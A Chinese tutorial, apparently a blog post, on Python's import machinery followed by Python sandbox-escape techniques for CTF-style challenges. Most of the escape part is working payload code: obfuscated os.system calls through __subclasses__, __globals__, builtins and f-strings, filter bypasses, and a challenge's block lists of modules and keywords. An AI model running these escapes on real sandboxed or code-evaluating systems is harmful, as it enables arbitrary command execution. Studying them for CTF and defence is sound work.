主要有两个作用：\n\n1. 传递 —— 可以在导入系统的不同组件，如 finder 和 loader 之间传递状态信息\n2. 模板(boilerplate)构建 —— 导入机制可以根据 module spec 执行模板加载操作，没有 module spec 则 loader 需要负责完成这个工作。\n\nmodule spec 通过 module 对象的 **spec** 属性得以公开，可以查看 *ModuleSpec* 获取更多信息。\n\n```python\n import requests\nrequests.__spec__\nModuleSpec(name='requests', loader=<_frozen_importlib_external.SourceFileLoader object at 0x000002EE4EBBF7B8>, origin='C:\\\\Python37\\\\lib\\\\site-packages\\\\requests\\\\__init__.py', submodule_search_locations=['C:\\\\Python37\\\\lib\\\\site-packages\\\\requests'])\n```\n\n在 `_init_module_attrs` 步骤中，导入机制会根据 module spec 填充 module 对象（这个过程发生在 loader 执行模块之前）\n\n| **属性**    | 说明                                                         |\n| ----------- | ------------------------------------------------------------ |\n| __name__    | 模块的完全限定名                                             |\n| __loader__  | 模块加载时使用的 loader 对象，主要是用于内省                 |\n| __package__ | 取代 `__name__` 用于处理相对导入，必须设置！当导入包时，这个值和 `__name__` 相同；当导入子包时，则为其父包名；为顶级模块时，应该为空字符串 |\n| __spec__    | 导入时要使用的 module spec 对象                              |\n| __path__    | 如果模块为包，则必须设置！这个值为可迭代对象，如果没有进一步用途，可以为空，否则迭代结果应该为字符串 |\n| __file__    | 可选值，只有内置模块可以不设置 `__file__` 属性               |\n| __cached__  | 为编译后字节码文件所在路径，它和 `__file__` 的存在互不影响   |\n\n> 在命名空间包出来之前，如果想实现命名空间包功能，一般是在包的 `__init__.py` 中修改其 `__path__` 属性。随着 PEP420 的引入，命名空间包已经可以不需要 `__init__.py` 的这种操作了。\n\n### **path-based-finder 基于元路径查找器**\n\n上文已经提到过，Python 默认自带了几个 meta path 的 finder ，其中之一就是 **PathBasedFinder** ，它负责搜索 *import path* 上的路径。\n\n这个 finder 实际上并不知道如何进行 import ，它的工作只是遍历 *import path* 上的每一个条目，将它们关联到某个知道如何处理特定类型路径的 **path entry finder**（路径条目查找器）。\n\n> 根据术语表，**path entry** **finder** 是由 `sys.path_hook` 列表中的可调用对象返回的（前提是它知道如何根据特定路径条目找到模块）。\n\n可以将 *PathEntryFinder* 看作 *PathBasedFinder* 的具体实现。实际上，如果从 `sys.meta_path` 中移除了 *PathBasedFinder* ，则不会有任何 *PathEntryFinder* 被调用。\n\n### **path entry** **finder** **路径条目查找器**\n\n*PathBasedFinder* 会使用到三个变量，它们会提供给自定义导入机制的额外途径，包括：\n\n- `sys.path`\n- `sys.path_hooks`\n- `sys.path_importer_cache`\n\n> 包的 **path** 属性也会被使用。\n\n`sys.path` 是一个字符串列表，提供了模块和包的搜索位置。它的条目可以来自于文件系统的目录、zip 文件或者其他潜在可以找到模块的“位置”（参考 `site` 模块）。\n\n由于 *PathBasedFinder* 是一个 *meta path* *finder* ，所以必须实现了 `find_spec()` 方法。导入机制会通过调用这个方法来搜索 *import path* （通过传入 `path` 参数 —— 它是一个可遍历的字符串列表）。\n\n在 `find_spec()` 内部，会迭代 path 的每个条目，并且每次都查找与条目相对应的 *PathEntryFinder*。但由于这个操作会很耗资源，因此 *PathBasedFinder* 会维持一个缓存 —— `sys.path_importer_caceh` 来存放路径条目到 finder 之间的映射（虽然是这样子命名，但它存放的确实是 finder 对象而不是 importer 对象）。那么只要条目找到过一次 finder 就不会重新再匹配（你可以手动移除缓存条目来达到再次强制匹配的目的）。\n\n如果缓存中没有对应路径条目的键，则会迭代 `sys.path_hooks` 中的每个 可调用对象。这些可调用对象都接受一个 `path` 参数，并返回一个 *PathEntryFinder* 或者抛出 `ImportError` 异常。\n\n如果遍历完整个 `sys.path_hooks` 的可调用对象都没有返回 *PathEntryFinder*，则 `find_spec()` 方法会在 `sys.path_importer_cache` 中存入 `None` 并返回 `None` ，表示 *PathBasedFinder* 无法找到该模块。\n\n## 总结\n\npython启动时默认初始化能得到的:\n\n- sys.modules : 一个存放了曾经导入的模块(也包括一些内置模块)的字典(缓存)\n- sys.path ：初始化的路径(包括项目路径，系统PATH路径，Python安装的路径)\n\n当需要import一个模块时，主要分为查找和加载两步\n\n- 查找：首先在sys.modules中查找，若未查找到，则触发相应查找机制，通过内置的finder查找器在已经初始化好（sys.path;meta_path）的路径下寻找模块,若找到则会返回一个 `spec` 对象，否则抛出不能找到模块的异常\n- 加载：首先会将模块信息缓存在sys.modules中，如果加载失败，那么失败的模块会从 `sys.modules` 中被移除，然后创建module对象，创建相应的命名空间，并对该module对象进行初始化--写入一些模块内置属性（__name__、__spec__等等）然后传递module对象给加载核心loader,在模块的全局命名空间（module.__dict__）中执行模块代码(创建模块代码中相应对象和执行相应代码)。如果 loader 不能执行模块，应该抛出 `ImportError` 异常\n\n加载成功后返回对应module对象赋给import 后面的模块名(当然也可以通过as赋予其他名字)，并写入缓存\n\n参考文章：http://sinhub.cn/2019/05/python-import-machinery-part-one/\n\n\n\n# 命令执行沙箱逃逸\n\n## import\n\n直接禁用 `import os` 肯定是不行的\n\n```\nimport  os\nimport   os\nimport    os\n...\n```\n\n如果多个空格也过滤了，Python 能够 import 的可不止 `import`，还有 `__import__`：`__import__('os')`，`__import__`被干了还有 `importlib`：`importlib.import_module('os').system('ls')`\n\nimport本质上就是执行一遍导入的库。这个过程实际上可以用 `execfile` 来代替（python2）：\n\n```\nexecfile('/usr/lib/python2.7/os.py')\nsystem('ls')\n```\n\n也可以这样，比较通用\n\n```\nwith open('/usr/lib/python3.6/os.py','r') as f:\n    exec(f.read())\n\nsystem('ls')\n```\n\n不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下\n\n```\nimport sys\nprint(sys.path)\n```\n\n如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：\n\n注意，这里不能用 `del sys.modules['os']`，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。\n\n所以删了 `sys.modules['os']` 只会让 Python 重新加载一次 os。\n\n## 函数\n\n可以通过 `getattr` 拿到对象的方法、属性\n\n与 `getattr` 相似的还有 `__getattr__`、`__getattribute__`，它们自己的区别就是`getattr`相当于`class.attr`，都是获取类属性/方法的一种方式，在获取的时候会触发`__getattribute__`，如果`__getattribute__`找不到，则触发`__getattr__`\n\n```\nimport os\ngetattr(os, 'metsys'[::-1])('whoami')\n```\n\n```\n>>> getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')\nmacr0phag3\n0\n```\n\n## 字符串\n\n代码中要是出现 `os`，直接不让运行。那么可以利用字符串的各种变化来引入 os\n\n以禁掉os字符串为例：\n\n1. 字符串数组逆序\n\n```\n__import__('so'[::-1]).system('ls')\n```\n\n1. 字符串拼接\n\n```\nb = 'o'\na = 's'\n__import__(a+b).system('ls')\n```\n\n1. 还可以利用 `eval` 或者 `exec`\n\n```\n>>> eval(')\"imaohw\"(metsys.)\"so\"(__tropmi__'[::-1])\nmacr0phag3\n0\n>>> exec(')\"imaohw\"(metsys.so ;so tropmi'[::-1])\nmacr0phag3\n```\n\neval、exec 都是相当危险的函数，exec 比 eval 还要危险\n\n对字符串的处理可以有：逆序、拼接、base64、hex、rot13...等等，\n\n```\n['__builtins__'] \n['\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f']\n[u'\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f']\n['X19idWlsdGluc19f'.decode('base64')]\n['__buil'+'tins__']\n['__buil''tins__']\n['__buil'.__add__('tins__')]\n[\"_builtins_\".join(\"__\")]\n['%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]\n...\n```\n\n## **builtins、__builtin__与__builtins__**\n\n在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如`chr`、`open`。之所以可以这样，是因为 Python 有个叫`内建模块`（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 `LEGB` 规则来找的，其中 B 即代表内建模块\n\n在 2.x 版本中，内建模块被命名为 `__builtin__`，到了 3.x 就成了 `builtins`。它们都需要 import 才能查看：\n\n```\n>>> '__import__' in dir(__builtins__)\nTrue\n>>> __builtins__.__dict__['__import__']('os').system('whoami')\nmacr0phag3\n0\n>>> 'eval' in dir(__builtins__)\nTrue\n>>> 'execfile' in dir(__builtins__)\nTrue\n```\n\n这里稍微解释下 `x.__dict__` ，它是 x 内部所有属性名和属性值组成的字典，有以下特点：\n\n1. 内置的数据类型没有 **dict** 属性\n2. 每个类有自己的 **dict** 属性，就算存着继承关系，父类的 **dict** 并不会影响子类的 **dict**\n3. 对象也有自己的 **dict** 属性，包含 `self.xxx` 这种实例属性\n\n那么既然`__builtins__`有这么多危险的函数，不如将里面的危险函数破坏了：\n\n但是我们可以利用 `reload(__builtins__)` 来恢复 `__builtins__`。不过，我们在使用 `reload` 的时候也没导入，说明 `reload`也在 `__builtins__`里，那如果连`reload`都从`__builtins__`中删了，就没法恢复`__builtins__`了，需要另寻他法。还有一种情况是利用 `exec command in _global` 动态运行语句时的绕过\n\n## **通过继承关系逃逸**\n\n在 Python 中提到继承就不得不提 `mro`，`mro`就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x 中新式类一统江湖，默认继承 `object`，当然也是使用的 C3 搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python 中新式类都有个属性，`.__mro__` 或 `.mro()`，是个元组，记录了继承关系：\n\n```\n>>> ''.__class__.__mro__\n(<class 'str'>, <class 'object'>)\nCEYLON\n```\n\n 类的实例在获取 `__class__` 属性时会指向该实例对应的类。可以看到，`''`属于 `str`类，它继承了 `object` 类，这个类是所有类的超类。具有相同功能的还有`__base__`和`__bases__`。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：\n\n```\n>>> class test:\n...  pass\n...\n>>> test.__bases__\n()\n>>> class test(object):\n...  pass\n...\n>>> test.__bases__\n(<type 'object'>,)\nPYTHON-REPL\n```\n\n那么知道这个有什么用呢？\n\n由于没法直接引入 os，那么假如有个库叫`oos`，在`oos`中引入了`os`，那么我们就可以通过`__globals__`拿到 os。例如，`site` 这个库就有 `os`：\n\n```\n>>> import site\n>>> site.os\n<module 'os' from '/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py'>\nMOONSCRIPT\n```\n\n怎么理解这个 **globals** 呢？它是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 `builtin_function_or_method` 或者是 `wrapper_descriptor` 、`method-wrapper` 类型的函数，例如 `range`、`range.__init__`、`''.split` 等等。\n\n那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 `import site`。可以利用 `reload`，变相加载 `os`：\n\n```\n>>> import site\n>>> os\nTraceback (most recent call last):\n File \"<stdin>\", line 1, in <module>\nNameError: name 'os' is not defined\n>>> os = reload(site.os)\n>>> os.system('whoami')\nmacr0phag3\n0\nPYTHON-REPL\n```\n\n还有，既然所有的类都继承的`object`，那么我们先用`__subclasses__`看看它的子类，以 2.x 为例：\n\n```\n>>> for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i\n...\n(0, <type 'type'>)\n(1, <type 'weakref'>)\n(2, <type 'weakcallableproxy'>)\n(3, <type 'weakproxy'>)\n(4, <type 'int'>)\n(5, <type 'basestring'>)\n(6, <type 'bytearray'>)\n(7, <type 'list'>)\n(8, <type 'NoneType'>)\n(9, <type 'NotImplementedType'>)\n(10, <type 'traceback'>)\n(11, <type 'super'>)\n(12, <type 'xrange'>)\n(13, <type 'dict'>)\n(14, <type 'set'>)\n(15, <type 'slice'>)\n(16, <type 'staticmethod'>)\n(17, <type 'complex'>)\n(18, <type 'float'>)\n(19, <type 'buffer'>)\n(20, <type 'long'>)\n(21, <type 'frozenset'>)\n(22, <type 'property'>)\n(23, <type 'memoryview'>)\n(24, <type 'tuple'>)\n(25, <type 'enumerate'>)\n(26, <type 'reversed'>)\n(27, <type 'code'>)\n(28, <type 'frame'>)\n(29, <type 'builtin_function_or_method'>)\n(30, <type 'instancemethod'>)\n(31, <type 'function'>)\n(32, <type 'classobj'>)\n(33, <type 'dictproxy'>)\n(34, <type 'generator'>)\n(35, <type 'getset_descriptor'>)\n(36, <type 'wrapper_descriptor'>)\n(37, <type 'instance'>)\n(38, <type 'ellipsis'>)\n(39, <type 'member_descriptor'>)\n(40, <type 'file'>)\n(41, <type 'PyCapsule'>)\n(42, <type 'cell'>)\n(43, <type 'callable-iterator'>)\n(44, <type 'iterator'>)\n(45, <type 'sys.long_info'>)\n(46, <type 'sys.float_info'>)\n(47, <type 'EncodingMap'>)\n(48, <type 'fieldnameiterator'>)\n(49, <type 'formatteriterator'>)\n(50, <type 'sys.version_info'>)\n(51, <type 'sys.flags'>)\n(52, <type 'exceptions.BaseException'>)\n(53, <type 'module'>)\n(54, <type 'imp.NullImporter'>)\n(55, <type 'zipimport.zipimporter'>)\n(56, <type 'posix.stat_result'>)\n(57, <type 'posix.statvfs_result'>)\n(58, <class 'warnings.WarningMessage'>)\n(59, <class 'warnings.catch_warnings'>)\n(60, <class '_weakrefset._IterationGuard'>)\n(61, <class '_weakrefset.WeakSet'>)\n(62, <class '_abcoll.Hashable'>)\n(63, <type 'classmethod'>)\n(64, <class '_abcoll.Iterable'>)\n(65, <class '_abcoll.Sized'>)\n(66, <class '_abcoll.Container'>)\n(67, <class '_abcoll.Callable'>)\n(68, <type 'dict_keys'>)\n(69, <type 'dict_items'>)\n(70, <type 'dict_values'>)\n(71, <class 'site._Printer'>)\n(72, <class 'site._Helper'>)\n(73, <type '_sre.SRE_Pattern'>)\n(74, <type '_sre.SRE_Match'>)\n(75, <type '_sre.SRE_Scanner'>)\n(76, <class 'site.Quitter'>)\n(77, <class 'codecs.IncrementalEncoder'>)\n(78, <class 'codecs.IncrementalDecoder'>)\nPYTHON\n```\n\n可以看到，site 就在里面，以 2.x 的`site._Printer`为例（py3.x 中已经移除了这里 **globals** 的 `os`）：\n\n```\n>>> ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os']\n<module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'>\n\n>>> # 为了避免 index 位置问题，可以这样写：\n>>> [i._Printer__setup.__globals__['os'] for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == \"_Printer\"]\n<module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'>\nPROLOG\n```\n\nos 又回来了。并且 site 中还有 `__builtins__`。\n\n这个方法不仅限于 A->os，还阔以是 A->B->os，比如 2.x 中的 `warnings`：\n\n```\n>>> import warnings\n>>> \n>>> warnings.os\nTraceback (most recent call last):\n File \"<stdin>\", line 1, in <module>\nAttributeError: 'module' object has no attribute 'os'\n>>> \n>>> warnings.linecache\n<module 'linecache' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc'>\n>>>\n>>> warnings.linecache.os\n<module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'>\nPYTHON\n```\n\n在继承链中就可以这样（py3.x 中已经移除了这里 **globals** 的 `linecache`）：\n\n```\n>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')\nmacr0phag3\n0\n>>> # 为了避免 index 位置问题，可以这样写：\n>>> [i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == \"catch_warnings\"]\nPROLOG\n```\n\n 顺便说一下，`warnings`这个库中有个函数：`warnings.catch_warnings`，它有个`_module`属性：\n\n```\n def __init__(self, record=False, module=None):\n...\n self._module = sys.modules['warnings'] if module is None else module\n...\nOXYGENE\n```\n\n所以通过`_module`也可以构造 payload（py3.x 中已经移除了 `catch_warnings` 的 `linecache`）：\n\n```\n>>> [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.linecache.os.system('whoami')\nmacr0phag3\n0\nSTYLUS\n```\n\n3.x 中的`warnings`虽然没有 `linecache`，也有`__builtins__`。\n\n同样，py3.x 中有`<class 'os._wrap_close'>`，利用方式可以为：\n\n```\n>>> ''.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')\nmacr0phag3\n0\n>>> # 为了避免 index 位置问题，可以这样写：\n>>> [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == \"_wrap_close\"][0].__init__.__globals__['system']('whoami')\nPROLOG\n```\n\n当然这样也是可以的（3.x）：\n\n```\nset.mro()[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')\nPYTHON\n```\n\n顺便提一下，`object` 本来就是可以使用的，如果没过滤的话，payload 可以再简化为：\n\n```\nobject.__subclasses__()[133].__init__.__globals__['system']('whoami')\nPYTHON\n```\n\n还有一种是利用`builtin_function_or_method` 的 `__call__`：\n\n```\n\"\".__class__.__mro__[-1].__subclasses__()[29].__call__(eval, '1+1')\nSQF\n```\n\n 或者简单一点：\n\n```\n[].pop.__class__.__call__(eval, '1+1')\nSTYLUS\n```\n\n上面这些 payload 大多数是直接 index 了，但是直接用 index 不太健壮，可以都换成列表推导式，用 **name** 来获取想要的 class，上面也举了好几个例子了，这里就不多说啦。\n\n最后再补充几个。\n\n可以这样利用：\n\n```\nclass test(dict):\n def __init__(self):\n print(super(test, self).keys.__class__.__call__(eval, '1+1'))\n # 如果是 3.x 的话可以简写为：\n # super().keys.__class__.__call__(eval, '1+1'))\ntest()\nSCSS\n```\n\n还可以利用异常逃逸：\n\n```\nhack = lambda : [0][1]\ntry:\n hack()\nexcept Exception as e:\n e.__traceback__.tb_next.tb_frame.f_globals['__builtins__']['__import__']('os').system('whoami')\nPYTHON\n```\n\n还可以利用 `format`：\n\n1. `\"{0.__class__.__base__}\".format([])`\n2. `\"{x.__class__.__base__}\".format(x=[])`\n3. `\"{.__class__.__base__}\".format([])`\n4. `(\"{0.__class_\"+\"_.__base__}\").format([])`\n\n（这里顺手记录下，对于字典键是整数型的比如 `{\"1\":2}`，format 是无法拿到值的 :)，这样会报错：`''' {0['1']} '''.format({\"1\":2})`，`'1'` 引号去掉的话又会报没有这个键，这个特性可以见[文档](https://docs.python.org/3/library/string.html#format-string-syntax)）\n\n上面的这些利用方式总结起来就是通过 `.mro()`、`__class__`、`type(...)`、`__mro__`、`__subclasses__`、`__base__`、`__bases__` 等属性/方法去获取 `object`，再根据`__globals__`找引入的`__builtins__`或者`eval`等等能够直接被利用的库，或者找到`builtin_function_or_method`类/类型`__call__`后直接运行`eval`。\n\n最后，其实沙箱逃逸，对于不同的第三方库可能会存在一些特殊的利用方式，比如 `jinja2`，这类属于 `SSTI` 漏洞，可以看这篇博客：[传送门🚪](https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/)，这里就不多说了。\n\n其实 SSTI 也会用到这里的很多技巧，两者知识面相互交叠。\n\n# **文件读写**沙箱逃逸\n\n2.x 有个内建的 `file`：\n\n```\n>>> file('key').read()\n'Macr0phag3\\n'\n>>> file('key', 'w').write('Macr0phag3')\n>>> file('key').read()\n'Macr0phag3'\nDELPHI\n```\n\n还有个 `open`，2.x 与 3.x 通用。\n\n还有一些库，例如：`types.FileType`(rw)、`platform.popen`(rw)、`linecache.getlines`(r)。\n\n为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为`math.py`，然后 import 进来： math.py：\n\n```\nimport os\n\nprint(os.system('whoami'))\nMOONSCRIPT\n```\n\n 调用\n\n```\n>>> import math\nmacr0phag3\n0\nPYTHON-REPL\n```\n\n 这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在`sys.modules`中有的，这些库无法这样利用，会直接从`sys.modules`中加入，比如`re`：\n\n```\n>>> 're' in sys.modules\nTrue\n>>> 'math' in sys.modules\nFalse\n>>>\nPYTHON-REPL\n```\n\n 当然在`import re` 之前`del sys.modules['re']`也不是不可以...\n\n最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 `test`的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。\n\n读文件暂时没什么发现特别的地方。\n\n剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：\n\n```\n>>> __builtins__.open('key').read()\n'Macr0phag3\\n'\nLIVECODESERVER\n```\n\n 或者\n\n```\n>>> ().__class__.__base__.__subclasses__()[40]('key').read()\n'Macr0phag3'\nGCODE\n```\n\n# **敏感信息泄露**\n\n这个也算只能读吧。\n\n1. `dir()`\n2. `__import__(\"__main__\").x`，其中 **main** 还会泄露脚本的绝对路径：`<module '__main__' from 'xxx.py'>`\n3. `__file__`，文件绝对路径\n4. `x.__dict__`\n5. `locals()`\n6. `globals()`\n7. `vars()`\n8. `sys._getframe(0).f_code.co_varnames`\n9. `sys._getframe(0).f_locals`\n10. `inspect.x`，inspect 有很多方法可以获取信息，比如获取源码可以用 `inspect.getsource`，还有其他很多的功能\n11. ...\n\n这有一篇不错的文章，推荐阅读：\n\nhttps://www.cnblogs.com/dechinphy/p/modify-locals.html\n\n# **其他**\n\n这些行为不像是 oj 会做得出来的，ctf 倒是有可能出现。\n\n### **过滤 [ ]**\n\n应对的方式就是将`[]`的功能用`pop`、`__getitem__` 代替（实际上`a[0]`就是在内部调用了`a.__getitem__(0)`）：\n\n```\n>>> ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('whoami').read()\n'macr0phag3\\n'\nSTYLUS\n```\n\n当然，dict 也是可以 pop 的：`{\"a\": 1}.pop(\"a\")`\n\n当然也可以用 `next(iter())` 替代，或许可以加上 `max` 之类的玩意。\n\n### **过滤引号**\n\n> chr\n\n最简单就是用 `chr` 啦\n\n```\nos.system(\n chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)\n)\nSCSS\n```\n\n> 扣字符\n\n利用 `str` 和 `[]`，挨个把字符拼接出来\n\n```\nos.system(\n str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(()a)[10]+str(().__class__.__new__)[3]\n)\nSCSS\n```\n\n 当然 `[]` 如果被过滤了也可以 bypass，前面说过了。\n\n如果 str 被过滤了怎么办呢？`type('')()`、`format()` 即可。同理，`int`、`list` 都可以用 `type` 构造出来。\n\n> 格式化字符串\n\n那过滤了引号，格式化字符串还能用吗？\n\n`(chr(37)+str({}.__class__)[1])%100 == 'd'`\n\n又起飞了...\n\n> dict() 拿键它不香吗？\n>\n> ```\n> 'whoami' ==\n> list(dict(whoami=1))[0] ==\n> str(dict(whoami=1))[2:8] ==a\n> PYTHON\n> ```\n\n### **限制数字**\n\n上面提到了字符串过滤绕过，顺便说一下，如果是过滤了数字（虽然这种情况很少见），那绕过的方式就更多了，我这里随便列下：\n\n1. 0：`int(bool([]))`、`Flase`、`len([])`、`any(())`\n2. 1：`int(bool([\"\"]))`、`True`、`all(())`、`int(list(list(dict(a၁=())).pop()).pop())`\n3. 获取稍微大的数字：`len(str({}.keys))`，不过需要慢慢找长度符合的字符串\n4. 1.0：`float(True)`\n5. -1：`~0`\n6. ...\n\n其实有了 `0` 就可以了，要啥整数直接做运算即可：\n\n```\n0 ** 0 == 1\n1 + 1 == 2\n2 + 1 == 3\n2 ** 2 == 4\n...\nPYTHON\n```\n\n任意浮点数稍微麻烦点，需要想办法运算，但是一定可以搞出来，除非是 π 这种玩意...\n\n### **限制空格**\n\n空格通常来说可以通过 `()`、`[]` 替换掉。例如：\n\n`[i for i in range(10) if i == 5]` 可以替换为 `[[i][0]for(i)in(range(10))if(i)==5]`\n\n### **限制运算符**\n\n> `> < ! - +` 这几个比较简单就不说了。\n\n`==` 可以用 `in` 来替换。\n\n替换 `or` 的测试代码\n\n```\nfor i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:\n ans = i[0]==i[1] or i[2]==i[3]\n print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans)\n print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans)\n print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans)\nPY\n```\n\n 上面这几个表达式都可以替换掉 `or`\n\n替换 `and` 的测试代码\n\n```\nfor i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:\n ans = i[0]==i[1] and i[2]==i[3]\n print(bool(eval(f'{i[0]==i[1]} & {i[2]==i[3]}')) == ans)\n print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans)\nPY\n```\n\n 上面这几个表达式都可以替换掉 `and`\n\n### **限制 ( )**\n\n这种情况下通常需要能够支持 exec 执行代码。因为有两种姿势：\n\n- 利用装饰器 `@`\n- 利用魔术方法，例如 `enum.EnumMeta.__getitem__`，\n\n利用这两种姿势，我在《OrangeKiller CTF 第 2 期》中出了 2 道题目，题解篇写的很详细，移步去看吧：[传送门](https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/)\n\n### **利用新特性**\n\nPEP 498 引入了 `f-string`，在 3.6 开始出现：[传送门🚪](https://docs.python.org/3.6/whatsnew/3.6.html#new-features)，食用方式：[传送门🚪](https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings)。所以我们就有了一种船新的利用方式：\n\n```\n>>> f'{__import__(\"os\").system(\"whoami\")}'\nmacr0phag3\n'0'\nPYTHON\n```\n\n 关注每次版本增加的新特性，或许能淘到点宝贝。\n\n### **利用反**序列化**攻击**\n\n反序列化攻击也是能用来逃逸，但是关于反序列化攻击的安全问题还挺多的，见这篇文章，见：[传送门🚪](https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/)\n\n## **🌰**\n\n这个例子来自`iscc 2016`的`Pwn300 pycalc`，相当有趣：\n\n```python\n#!/usr/bin/env python2\n# -*- coding:utf-8 -*-\n\n\ndef banner():\n print \"=============================================\"\n print \" Simple calculator implemented by python \"\n print \"=============================================\"\n return\n\n\ndef getexp():\n return raw_input(\">>> \")\n\n\ndef _hook_import_(name, *args, **kwargs):\n module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi',\n 'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache',\n 'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip',\n 'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil',\n 'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools',\n 'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new',\n 'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib',\n 'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile',\n 'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer',\n 'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',\n 'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib',\n 'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2',\n 'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport']\n for forbid in module_blacklist:\n if name == forbid: # don't let user import these modules\n raise RuntimeError('No you can\\' import {0}!!!'.format(forbid))\n # normal modules can be imported\n return __import__(name, *args, **kwargs)\n\n\ndef sandbox_filter(command):\n blacklist = ['exec', 'sh', '__getitem__', '__setitem__',\n '=', 'open', 'read', 'sys', ';', 'os']\n for forbid in blacklist:\n if forbid in command:\n return 0\n return 1\n\n\ndef sandbox_exec(command): # sandbox user input\n result = 0\n __sandboxed_builtins__ = dict(__builtins__.__dict__)\n __sandboxed_builtins__['__import__'] = _hook_import_ # hook import\n del __sandboxed_builtins__['open']\n _global = {\n '__builtins__': __sandboxed_builtins__\n }\n if sandbox_filter(command) == 0:\n print 'Malicious user input detected!!!'\n exit(0)\n command = 'result = ' + command\n try:\n exec command in _global # do calculate in a sandboxed environment\n except Exception, e:\n print e\n return 0\n result = _global['result'] # extract the result\n return result\n\n\nbanner()\nwhile 1:\n command = getexp()\n print sandbox_exec(command)\nPYTHON\n```\n\n`exec command in _global` 这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于`restricted execution mode`，这里不赘述了，感兴趣可以看这篇文章：[传送门🚪](http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html)。exec 加上定制的 globals 会使得沙箱安全很多，一些常规的 payload 是没法使用的，例如：\n\n```\n>>> ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__\nrestricted attribute\n>>> getattr(getattr(__import__('types'), 'FileType')('key'), 're''ad')()\nfile() constructor not accessible in restricted mode\nDELPHI\n```\n\n 不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 `__builtins__`，比如 types 库，来执行任意命令：\n\n```\n>>> getattr(__import__('types').__builtins__['__tropmi__'[::-1]]('so'[::-1]), 'mets' 'ys'[::-1])('whoami')\nmacr0phag3\nLISP\n```\n\n### **极端限制**\n\n这种限制一般是组合形式出现，而且通常只会出现在 CTF 中。\n\n> 